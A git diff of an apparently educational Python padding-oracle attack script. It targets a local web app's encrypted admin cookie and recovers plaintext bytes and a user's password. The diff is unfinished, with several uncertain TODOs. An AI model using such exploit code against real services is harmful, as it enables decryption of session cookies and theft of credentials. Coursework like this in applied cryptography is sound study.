@@ -10,6 +10,7 @@ import app.api.encr_decr
 
 import base64
 import binascii
+import random
 
 LOGIN_FORM_URL = "http://localhost:8080/login"
 SETCOINS_FORM_URL = "http://localhost:8080/setcoins"
@@ -51,6 +52,12 @@ def po_attack_2blocks(po, ctx):
     assert len(ctx) == 2*po.block_length, "This function only accepts 2 block "\
         "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)
     c0, c1 = list(split_into_blocks(ctx, int(po.block_length)))
+    rand_bytes = bytearray(16)
+    for i in range(len(rand_bytes)):
+        rand_bytes[i] = round(random.random() * 255)
+    # c0 = bytearray(16) + c0
+    # c0 = rand_bytes + c0
+    # c0 = c0 + rand_bytes
     print("C0 (len {}): {}".format(len(c0), c0))
     print("C1 (len {}): {}".format(len(c1), c1))
 
@@ -59,12 +66,12 @@ def po_attack_2blocks(po, ctx):
     plaintext = bytearray(16)
     # plaintext[0] = 255 # TODO: Don't init the admin byte to be 00, which looks valid to us
     count = 0
-    for i in range(15, -1, -1):
-        # print("Checking i: {}".format(i))
+    for i in range(15, 0, -1):
+        print("Checking i: {}".format(i))
         test = bytearray(16)
         for j in range(i + 1, 16):
-            test[j] = plaintext[j] ^ c0[j] ^ (16 - i)
-            # print("test with padding: {}".format(test))
+            test[j] = plaintext[j] ^ c0[j] ^ (16 - i) # TODO: Are we sure this is right?
+        # print("test with padding: {}".format(test))
         for val in range(256):
             test[i] = val
             # print("test with byte: {}".format(test))
@@ -74,6 +81,21 @@ def po_attack_2blocks(po, ctx):
                 count += 1
                 print("Padding passed: {}".format((i,val)))
                 plaintext[i] = val ^ c0[i] ^ (16 - i)
+                break # Keep me # TODO: See if we're getting multiple passes per index? -> Piazza post with Philippe?
+
+    # TODO: Need to recover last byte
+    test = bytearray(32)
+    for j in range(1, 16):
+        test[j+16] = plaintext[j] ^ c0[j] ^ (16)
+        for val in range(256):
+            test[16] = val
+            # print("test with byte: {}".format(test))
+            C1_prime = test + c1
+            # print("C1 Prime: {}".format(C1_prime))
+            if check_padding_response(C1_prime):
+                count += 1
+                print("Padding passed: {}".format((0,val)))
+                plaintext[0] = val ^ c0[0] ^ (16)
                 break # Keep me # TODO: See if we're getting multiple passes per index? -> Piazza post with Philippe?
 
     if count < 16:
@@ -133,8 +155,8 @@ if __name__ == "__main__":
     pw = "victim"
     # uname = "andrew"
     # pw = "hellomynameisandrewpalmeriliketosurf"
-    # uname = 'test'
-    # pw = 'thisisalongpasswordtotest'
+    uname = 'test'
+    pw = 'thisisalongpasswordtotest'
     assert(do_login_form(sess, uname,pw))
     print("Cookies after logon: {}".format(sess.cookies.get_dict()))
     admin_cookie = sess.cookies.get_dict()["admin"]
@@ -165,7 +187,7 @@ if __name__ == "__main__":
     # full_result = po_attack(po, TEST_COOKIE)
 
     # TODO: Capture user's password from admin cookie
-    # password = po_attack(po, admin_cookie_bytes)
+    password = po_attack(po, admin_cookie_bytes)
 
     # TODO: Manually decrypt password to test po attack
     # encryption_key = b'\x00'*16
